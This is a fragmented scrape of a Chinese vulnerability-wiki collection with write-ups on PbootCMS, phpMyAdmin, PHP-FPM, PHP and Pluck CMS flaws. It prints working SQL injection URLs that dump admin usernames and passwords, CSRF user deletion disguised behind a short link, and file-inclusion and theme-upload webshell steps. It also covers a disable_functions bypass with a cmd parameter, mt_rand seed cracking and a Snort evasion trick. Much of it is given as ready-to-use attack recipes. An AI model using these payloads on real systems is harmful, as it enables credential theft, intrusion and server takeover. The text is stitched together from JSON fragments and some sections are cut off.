http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123 0x01.3.2 漏洞解读 文件地址：PbootCMS-V1.2.1\\apps\\home\\controller\\ParserController.php 方法：index( // 首页 骚操作 注入 // parserAfter -> parserSpecifyListLabel public function index() { $content = parent::parser('index.html'); // 框架标签解析 $content = $this->parser->parserBefore($content); // CMS公共标签前置解析 $content = $this->parser->parserPositionLabel($content, - 1, '首页', SITE_DIR . '/'); // CMS当前位置标签解析 $content = $this->parser->parserSpecialPageSortLabel($content, 0, '', SITE_DIR . '/'); // 解析分类标签 $content = $this->parser->parserAfter($content); // CMS公共标签后置解析 $this->cache($content, true); } 文件地址：apps\\home\\controller\\ParserController.php 方法：parserAfter() 跟进 $content = $this->parser->parserAfter($content); 这个方法 // 解析全局后置公共标签 public function parserAfter($content) { ... $content = $this->parserSpecifyListLabel($content); // 指定列表 return $content; } 方法：parserSpecifyListLabel( 进入以后 查看调用了 $content = $this->parserSpecifyListLabel($content); 方法 // 解析指定分类列表标签 public function parserSpecifyListLabel($content) { ... // 数据筛选 骚操作注入 $where2 = array(); foreach ($_GET as $key => $value) { if (substr($key, 0, 4) == 'ext_') { // 其他字段不加入 $where2[$key] = get($key); } } ... // 读取数据 if ($page) { $data = $this->model->getList($scode, $num, $order, $where1, $where2); } else { $data = $this->model->getSpecifyList($scode, $num, $order, $where1, $where2); } } 这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。 这里接收了外部了外部所有的get参数然后判断了开头的前4个字符是否 ext_ 开头，如果符合就直接拼接进入$where2这个数组 然后带入数据库进行getList方法与getSpecifyList查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入 0x08.4 前台搜索框注入 0x08.4.1 漏洞利用 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123 0x08.4.2 漏洞讲解 文件地址：PbootCMS-V1.2.1\\apps\\home\\controller\\SearchController.php 方法：index() // 骚操作 注入 // parserSearchLabel public function index() { $content = parent::parser('search.html'); // 框架标签解析 $content = $this->parser->parserBefore($content); // CMS公共标签前置解析 $content = $this->parser->parserPositionLabel($content, 0, '搜索', url('/home/Search/index')); // CMS当前位置标签解析 $content = $this->parser->parserSpecialPageSortLabel($content, 0, '搜索结果', url('/home/Search/index')); // 解析分类标签 $content = $this->parser->parserSearchLabel($content); // 搜索结果标签 $content = $this->parser->parserAfter($content); // CMS公共标签后置解析 $this->cache($content, true); } 文件地址：apps\\home\\controller\\ParserController.php 方法：parserSearchLabel( 进入以后 查看调用了 $content = $this->parser->parserSearchLabel($content); 方法 // 解析内容搜索结果标签 public function parserSearchLabel($content) { ... foreach ($_GET as $key => $value) { if (! ! $value = get($key, 'vars')) { $where2[$key] = $value; } } ... // 读取数据 if (! $data = $this->model->getList($scode, $num, $order, $where1, $where2, $fuzzy)) { $content = str_replace($matches[0][$i], '', $content); continue; } } 这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。 这里接收了外部了外部所有的get参数然后就直接拼接进入$where2这个数组 然后带入数据库进行getList方法查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入 0x10 api模块注入 api模块的注入需要后端开启api功能，并且获得 api_appid 与 api_secret 才能注入。 或是说 开启了api功能并且关闭了API强制认证 这样也可以注入 所以较鸡助 0x10.1 接口注入一 0x10.1.1 漏洞演示 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1))--=1 post： 11=11 一定要post 要跑空post才能进流程 因为系统中会把 “空格”转为“_” 所以使用/**/绕过即可 0x10.1.2 漏洞讲解 路径：apps\\api\\controller\\CmsController.php 方法：search( 这里我把漏洞触发点发出来我们主要讲讲他即可 // 数据接收 foreach ($_GET as $key => $value) { if (! ! $value = get($key, 'vars')) { $where[$key] = $value; } } $data = $this->model->getList($acode, $scode, $num, $order, $where, $fuzzy); 从代码中看他会收集外部所有的 $_GET 带入 getList 进行入库查询 value 是我们无法控制所以无法注入的，可是key是我们可控制可注入的！！！跟进 getList方法 路径：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php function getList( // 列表内容 public function getList($acode, $scode, $num, $order, $where = array(), $fuzzy = true) { ... // 筛选条件支持模糊匹配 return parent::table('ay_content a')->field($fields) ->where($where1, 'OR') ->where($where2) ->where($where, 'AND', 'AND', $fuzzy) ->join($join) ->order($order) ->page(1, $num) ->decode() ->select(); } 这里我把关键代码放出来了，可以看到接收$where以后直接仍进了数据库进行操作造成了注入 0x10.2 接口注入二 0x10.2.1 漏洞利用 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addmsg post: contacts[contentl`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111 mobile = 111 content = 111 0x10.2.2 漏洞讲解 文件：PbootCMS-V1.2.1\\apps\\api\\controller\\CmsController.php 方法：addmsg( // 新增留言 注入 public function addmsg() { if ($_POST) { // 读取字段 if (! $form = $this->model->getFormField(1)) { json(0, '接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if ($value->required && ! $field_data) { json(0, $value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置其他字段 if ($data) { $data['acode'] = get('acode', 'var') ?: $this->lg; $data['user_ip'] = ip2long(get_user_ip()); $data['user_os'] = get_user_os(); $data['user_bs'] = get_user_bs(); $data['recontent'] = ''; $data['status'] = 0; $data['create_user'] = 'api'; $data['update_user'] = 'api'; } // 写入数据 if ($this->model->addMessage($value->table_name, $data)) { $this->log('API提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } json(1, '表单提交成功！'); } else { $this->log('API提交表单数据失败！'); json(0, '表单提交失败！'); } } else { json(0, '表单提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addMessage(data) 执行语句 文件：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php 函数：addMessage( // 新增留言 public function addMessage($table, $data) { return parent::table('ay_message')->autoTime()->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 0x10.3 接口注入三 0x10.3.1 漏洞利用 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addform?fcode=1 post: contacts[content`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111 mobile = 111 content = 123 0x10.3.2 漏洞讲解 // 表单提交 注入 public function addform() { if ($_POST) { if (! $fcode = get('fcode', 'var')) { json(0, '传递的表单编码fcode有误！'); } // 读取字段 if (! $form = $this->model->getFormField($fcode)) { json(0, '接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if ($value->required && ! $field_data) { json(0, $value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置创建时间 if ($data) { $data['create_time'] = get_datetime(); } // 写入数据 if ($this->model->addForm($value->table_name, $data)) { $this->log('API提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } json(1, '表单提交成功！'); } else { $this->log('API提交表单数据失败！'); json(0, '表单提交失败！'); } } else { json(0, '表单提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addForm(data) 执行语句 文件：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php 方法：addForm( // 新增表单数据 public function addForm($table, $data) { return parent::table($table)->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 14:34:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PbootCMS/2.html":{"url":"0day/PbootCMS/2.html","title":"PbootCMS csrf","keywords":"","body":"PbootCMS csrf 一、漏洞简介 二、漏洞影响 三、复现过程 我将网站建立在本地，本来想测试添加用户的操作，但是发现这里有formcheck验证，所以失败了 然后我想到了删除用户位置，首先我使用管理员账号登陆，在删除用户的操作时抓包。发现很简单。只有一个id来判断删除哪个用户 于是我直接构造一个新的url，http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004（上面是10003） 确认这个用户是存在的。然后访问http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004 删除成功 但是这样很容易被熟悉的管理员识别，我们可以利用段网站来进行攻击。 短网址生成网站https://www.ft12.com/ http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004 可以缩短为http://u6.gg/gPCcN 访问这个短网址，也可以变为http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004触发漏洞 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-21 21:45:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/phpmyadmin/2.html":{"url":"0day/phpmyadmin/2.html","title":"（CVE-2018-12613）phpmyadmin远程文件包含漏洞","keywords":"","body":"（CVE-2018-12613）phpmyadmin远程文件包含漏洞 一、漏洞简介 二、漏洞影响 phpMyAdmin 4.8.0和4.8.1受到影响。 三、复现过程 首先需要登录phpmyadmin payload http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../phpStudy/使用说明.txt 写入shell 第一种姿势 1、写入shell，测试语句： SELECT '' 2、查看自己的sessionid（cookie中phpMyAdmin的值）。(或者Bp抓包获取本地的cookie值也可以) 补充代码 如果上述方法不行的话，则用以下代码 select '' into outfile '/var/www/shell.php' 3、访问： http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../../../phpStudy/tmp/tmp/sess_20f18hqcr2mc0nmq96vp920r6phc06v3 第二种姿势 1、在数据表里面添加一句话(这里一点要用get！) 2、此时会在phpStudyMySQLdata 对应数据库下生成一个frm文件（不同版本路径可能不一样） 3、访问 http://0-sec.org/index.php?9ouu=phpinfo();&target=db_sql.php%253f/../../../../../../phpStudy/MySQL/data/9ouu/test.frm 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 13:30:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/phpmyadmin/1.html":{"url":"0day/phpmyadmin/1.html","title":"（CVE-2019-12616）phpMyAdmin CSRF","keywords":"","body":"（CVE-2019-12616）phpMyAdmin CSRF 一、漏洞简介 4.9.0之前在phpmyadmin中发现了一个问题。发现一个漏洞，允许攻击者对phpMyAdmin用户触发CSRF攻击。攻击者可以欺骗用户。 例如通过指向受害者的phpMyAdmin数据库的一个损坏的标记，并且攻击者可以潜在地将有效负载（例如特定的插入或删除语句）传递给受害者。 二、漏洞影响 三、复现过程 GET http://www.0-sec.org:9000/tbl_sql.php?sql_query=INSERT+INTO+%60pma__bookmark%60+(%60id%60%2C+%60dbase%60%2C+%60user%60%2C+%60label%60%2C+%60query%60)+VALUES+(DAYOFWEEK(%27%27)%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27)&show_query=1&db=phpmyadmin&table=pma__bookmark HTTP/1.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Connection: keep-alive Cookie: pmaCookieVer=5; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci; pmaUser-1=%7B%22iv%22%3A%22M16ZzlA0rqF9BZ1jFsssjQ%3D%3D%22%2C%22mac%22%3A%22804941d12fceca0997e181cbcb8427d68c668240%22%2C%22payload%22%3A%22mD9juTxAYhC7lA7XPWHWOw%3D%3D%22%7D; phpMyAdmin=9bdd66557e399fc1447bf253bc2dc133 Upgrade-Insecure-Requests: 1 Host: localhost:9000 攻击者可以很容易地创建一个假超链接，其中包含希望代表用户执行的请求，这样就可能由于错误地使用http方法而导致csrf攻击 #POC POC CVE-2019-12616 View my Pictures! 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 11:03:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Php/1.html":{"url":"0day/Php/1.html","title":"（CVE-2019-11043）远程命令执行","keywords":"","body":"（CVE-2019-11043）远程命令执行 一、漏洞简介 NgiNginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 nx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 二、漏洞影响 Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 location ~ /.php(/|$) { fastcgi_split_path_info ^(.+?.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } } 三、复现过程 https://github.com/ianxtianxt/CVE-2019-11043 ./phuip-fpizdam.exe [url] 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:40:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Php/2.html":{"url":"0day/Php/2.html","title":"bypass disablefunction","keywords":"","body":"bypass disablefunction 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD bypass_disablefunc.php有三个GET选项：cmd，outpath和sopath。 选项非常简单， cmd是你的命令， outpath是命令输出文件路径（可读和可写）， sopath是我们的共享对象bypass_disablefunc_x64.so的绝对路径。例如： http://0-sec.org/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so 一是cmd参数，待执行的系统命令（如pwd）; 二是outpath参数，保存命令执行输出结果的文件路径（如/ tmp / xx），便于在页面上显示，另外该参数，你应注意web是否有读写权限，web是否可跨目录访问，文件将被覆盖和删除等几点; 三是sopath参数，指定劫持系统函数的共享对象的绝对路径（如/var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意web是否可跨目录访问到它。 此外，bypass_disablefunc.php拼接命令和输出路径成为完整的命令行，所以你不用在cmd参数中重定向。 bypass_disablefunc_x64.so为执行命令的共享对象，用命令gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将bypass_disablefunc.c编译而来。若目标为x86架构，需要加上-m32选项重新编译bypass_disablefunc_x86.so 想办法将bypass_disablefunc.php和bypass_disablefunc_x64.so传到目标，指定好三个GET参数后，bypass_disablefunc.php即可突破disable_functions 已知问题： 1）不同目标环境可能需要重新编译共享对象。本项目中的bypass_disablefunc_x64.so是在debian，x64下编译的，在非debian系可能需要重新编译; 2）bypass_disablefunc.php需要对outpath指定的路径具有读写权限，若目标开启SELinux可能阻止web账号写文件。如，你用apache身份运行id，输出uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0，看到最后的context=system_u:system_r:httpd_t:s0没，就是SELinux在作祟。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 17:13:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Php/3.html":{"url":"0day/Php/3.html","title":"PHP序列化和反序列化语法差异问题","keywords":"","body":"PHP序列化和反序列化语法差异问题 介绍 官方文档中介绍PHP序列化和反序列化如下： 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 简单说序列化是对象转化字符串的过程，反序列化是字符串还原对象的过程。 环境 文章中所述内容使用环境如下: PHP7.3.1、SDK VSCode C++和C 环境配置建议参考：《WINDOWS下用VSCODE调试PHP7源代码》https://www.jianshu.com/p/29bc0443*6 (作者经过几小时尝试后找到最全的版本) 在网上公开参数反序列化执行流程已经非常详细，但是对于一些细节地方有一些不足，其中就包括序列化和反序列化之间的语法差异问题 差异问题 序列化 我们通过编译PHP内核源码分析，发现PHP序列化在默认情况下在对象转换中加入:{和}用来拼接成字符串。 [var.c] Line:882 static void php_var_serialize_intern() Line:896 if (ce->serialize(struc, &serialized_data, &serialized_length, (zend_serialize_data *)var_hash) == SUCCESS) { smart_str_appendl(buf, \"C:\", 2); smart_str_append_unsigned(buf, ZSTR_LEN(Z_OBJCE_P(struc)->name)); smart_str_appendl(buf, \":\\\"\", 2); smart_str_append(buf, Z_OBJCE_P(struc)->name); smart_str_appendl(buf, \"\\\":\", 2); smart_str_append_unsigned(buf, serialized_length); smart_str_appendl(buf, \":{\", 2); smart_str_appendl(buf, (char *) serialized_data, serialized_length); smart_str_appendc(buf, '}'); } Line:952 smart_str_appendl(buf, \":{\", 2); Line:995 smart_str_appendc(buf, '}'); 咱们来看上面这段代码，PHP会使用smart_str_appendl为序列化字符串前后拼接:{和}，从var.c的第882行开始进入序列化逻辑。在第896行进行序列化字符串拼接，第952行和第995行，对于内嵌方法进行拼接。 反序列化 反序列化是将序列化的字符串，按照一定语法规则进行转化还原。 [var_unserialize.c] Line:655 static int php_var_unserialize_internal() Line:674 { YYCTYPE yych; static const unsigned char yybm[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, }; if ((YYLIMIT - YYCURSOR) 通过内核代码能够看到第655行进入反序列化，反序列化是利用词法扫描，判断各项符号转换对应对象。能够看到反序列化中对于}进行了处理，处理中只是对计数器加一并没有其他操作。 实际作用 反序列化语法的差异，对于安全防护设备判断反序列化产生很大的影响。在Snort中，有段规则如下： alert tcp any any -> any [80,8080,443] (uricontent:\".php\"; pcre:\"/\\{\\w:.+?\\}/\"; sid:1; msg:php_serialize;) 在攻击载荷中可以使用大多数字符代替{},从而导致规则失效。 总结 在红队攻击中可以利用PHP序列化和反序列化语法差异，从而达到绕过防护的目的。 在蓝队防御中建议考虑定义中所述不会保存对象的方法，只会保存类的名字。，拦截保存类的名字，以及语法中相同的字符比如冒号进行防御。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 21:08:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Php/4.html":{"url":"0day/Php/4.html","title":"php mt_rand函数的安全问题探讨","keywords":"","body":"php mt_rand函数的安全问题探讨 mt_rand() 函数的安全性问题 php -r 'echo getrandmax().\"\\n\".mt_getrandmax().\"\\n\"; echo (pow(2,31)-1).\"\\n\";' 在我的 linux 64 位系统中,rand() 和 mt_rand() 产生的最大随机数都是2147483647, 正好是 2^31-1 , 也就是说随机播种的种子也是在这个范围中,0 – 2147483647 的这个范围是允许我们进行爆破的. 但是用 php爆破比较慢 这里放一个爆破poc的d地址 php_mt_seed爆破程序 https://github.com/ianxtianxt/php-mt_rand 下面演示一下它的用法: 在例子中,我没有自己播种种子,而是让php自动去播种一个种子并产生一个随机数,然后用 php_mt_seed 这个工具把产生的随机数作为参数,去爆破种子,最后的得到了四个结果. 经过验证,四个结果都是对的.都会产生这样的一个随机数. 但是还有一个疑问,就是 php manual 中说,自动播种种子是指:在每次调用 mt_rand()函数之前都播种一次种子呢,还是多次调用 mt_rand()函数之前,只播种一次种子呢,这对于我们能否猜到产生的随机数序列至关重要. 看下面的测试: 在测试中,在没有进行手工播种的情况下产生两个连续的随机数,然后去爆破种子,得到了四个可能种子,经过测试发现其中一个种子产生的随机数序列和预期的相同,所以可以猜想在php中产生一系列的随机数时,只进行了一次播种! 那请考虑下面代码的安全性: 我们是否可以根据公开的key,猜到 $private 呢? 运行一次上面的代码: njctf$ php mtRand.php [*] This is a key for public:uS66FDD9LCR62UV3 [*] Create a private key which you don\\'t know:t3JSUHzYAv 下面演示破解过程,首先获得public key在每一位在字符串中的位置: 然后用 php_mt_seed 进行破解,这个需要的时间还是挺长的,几分钟左右. 已经成功的破解了一个seed,下面看这个seed对不对: 跟刚才的结果一模一样 : 这样就说明了,我们只需要拿到public key,就可以预测到private key 的值了. 但是在有的一些环境中，public key可能在private key之后产生，但是知道private key的位数 怎么预测private key呢？ 强大的php_mt_seed_4.0,支持一些统配的写法，把未知的都写成参数 0 0 0 0 就可以了php_mt_seed详细的使用说明。它就会跳过前面的mt_rand()的一些输出，直接匹配后面的： 下面测试我们获得了private key，来猜测public key的情况。 下面就开始破解： ➜ Desktop echo $(python -c \"print '0 '*64\") $(php mtRand.php) | xargs ~/script/php_mt_seed-4.0/php_mt_seed Pattern: SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 Version: 3.0.7 to 5.2.0 Found 0, trying 0xfc000000 - 0xffffffff, speed 65.2 Mseeds/s Version: 5.2.1+ Found 0, trying 0xf0000000 - 0xf1ffffff, speed 5.5 Mseeds/s seed = 0xf0430121 = 4030923041 (PHP 5.2.1 to 7.0.x; HHVM) Found 1, trying 0xfe000000 - 0xffffffff, speed 5.5 Mseeds/s Found 1 可以看到破解得到的seed和之前的一样。 接下来看一个 njctf中的一个例子,只贴部分关键代码: 我们的目标是猜测出filename. 这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了. rand() 函数的安全性问题 rand() 函数在产生随机数的时候没有调用 srand(),则产生的随机数是有规律可询的. 具体的说明请看这里http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/ 产生的随机数可以用下面这个公式预测 : state[i] = state[i-3] + state[i-31] (一般预测值可能比实际值要差1) 写下面测试代码,验证一下: =31) { echo \"$randStr[$i]=(\".$randStr[$i-31].\"+\".$randStr[$i-3].\") mod 31\".\"\\n\"; } } ?> 看一下结果: 发现预测的值,基本都是对的,这样就可以根据之前生成的随机数,预测之后产生的随机数. 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 12:53:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Pluck cms/1.html":{"url":"0day/Pluck cms/1.html","title":"Pluck CMS后台另两处任意代码执行","keywords":"","body":"Pluck CMS后台另两处任意代码执行 一、漏洞简介 二、漏洞影响 三、复现过程 第一处：过滤不严导致单引号逃逸 在function.php里面blog_save_post()函数 function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) { //Check if 'posts' directory exists, if not; create it. if (!is_dir(BLOG_POSTS_DIR)) { mkdir(BLOG_POSTS_DIR); chmod(BLOG_POSTS_DIR, 0777); } //Create seo-filename $seoname = seo_url($title); //Sanitize variables. $title = sanitize($title, true); $content = sanitizePageContent($content, false); if (!empty($current_seoname)) { $current_filename = blog_get_post_filename($current_seoname); $parts = explode('.', $current_filename); $number = $parts[0]; //Get the post time. include BLOG_POSTS_DIR.'/'.$current_filename; if ($seoname != $current_seoname) { unlink(BLOG_POSTS_DIR.'/'.$current_filename); if (is_dir(BLOG_POSTS_DIR.'/'.$current_seoname)) rename(BLOG_POSTS_DIR.'/'.$current_seoname, BLOG_POSTS_DIR.'/'.$seoname); } } else { $files = read_dir_contents(BLOG_POSTS_DIR, 'files'); //Find the number. if ($files) { $number = count($files); $number++; } else $number = 1; if (empty($force_time)) $post_time = time(); else $post_time = $force_time; } //Save information. $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; save_file(BLOG_POSTS_DIR.'/'.$number.'.'.$seoname.'.php', $data); //Return seoname under which post has been saved (to allow for redirect). return $seoname; } 其中 $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; $title $content 均被过滤，$post_time不可控，$category可控 所以只要把$cont2变成我们的payload即可 第二处：安装模版+文件包含导致任意命令执行 很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。 1、直接访问失败 首先准备一个shell.php里面是我们的phpinfo(); 然后打包成shell.zip，直接上传主题 发现确实上传并且解压成功 但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问 2、文件包含突破 所以就想到需要找一个位置对其进行包含，来达到执行的目的。 首先看到admin.php中关于theme的部分 跟进 data/inc/theme.php，发现调用了get_themes()方法 跟进 functions.all.php，查看get_themes()方法 function get_themes() { $dirs = read_dir_contents('data/themes', 'dirs'); if ($dirs) { natcasesort($dirs); foreach ($dirs as $dir) { if (file_exists('data/themes/'.$dir.'/info.php')) { include_once ('data/themes/'.$dir.'/info.php'); $themes[] = array( 'title' => $themename, 'dir' => $dir ); } } return $themes; } else return false; } 发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件 此时info.php可控，就导致了任意代码执行。 3、利用方法 首先准备一个info.php 然后打包压缩成shell.zip 上传安装主题，然后点击回到主题页，此时触发文件包含。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:41:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Pluck cms/2.html":{"url":"0day/Pluck cms/2.html","title":"Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell","keywords":"","body":"Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell 一、漏洞简介 二、漏洞影响 Pluck CMS Pluck CMS 三、复现过程 1、分析过程 目前最新版本为4.7.10，个人测试github上最旧的4.7.2版本仍然存在该漏洞，框架本身语言选择模块数据注入导致的文件包含漏洞，官方更新版本并没有对这部分代码进行修改，可以认为是全版本通用的。该漏洞是在复现\"我怎么这么帅\"在先知发表的《Pluck CMS 4.7.10远程代码执行漏洞分析》之余审计其他代码发现的，在此致谢。 